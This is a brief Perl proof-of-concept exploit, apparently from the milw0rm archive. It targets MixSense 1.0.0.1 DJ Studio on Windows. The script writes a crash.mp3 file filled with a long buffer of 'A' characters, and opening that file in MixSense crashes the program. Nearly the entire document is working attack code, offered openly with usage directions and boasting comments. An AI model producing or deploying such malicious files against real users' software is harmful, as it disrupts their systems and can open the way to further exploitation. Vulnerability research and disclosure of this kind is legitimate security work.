#!/usr/bin/perl -w
#
# MixSense 1.0.0.1 DJ Studio (.mp3 file) Crash Vulnerability Exploit
#
# Founded and exploited by prodigy
#
# Contact: smack_the_stream@hotmail.com
# 
# Vendor: MixSense
#
# Usage to reproduce the bug: when you created the malicious file, open with Mixsense and booom!
#
# Platform: Windows
#
###################################################################

==PoC==

use strict;

use diagnostics;

my $file= "crash.mp3";

my $boom= "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" x 5000;

open($FILE,">>$file");

print $FILE "$boom";

close($FILE);

print "File Created successfully\n";

==EndPoC==


##Greetz: Greetz myself for find the bug.

# milw0rm.com [2009-07-16]
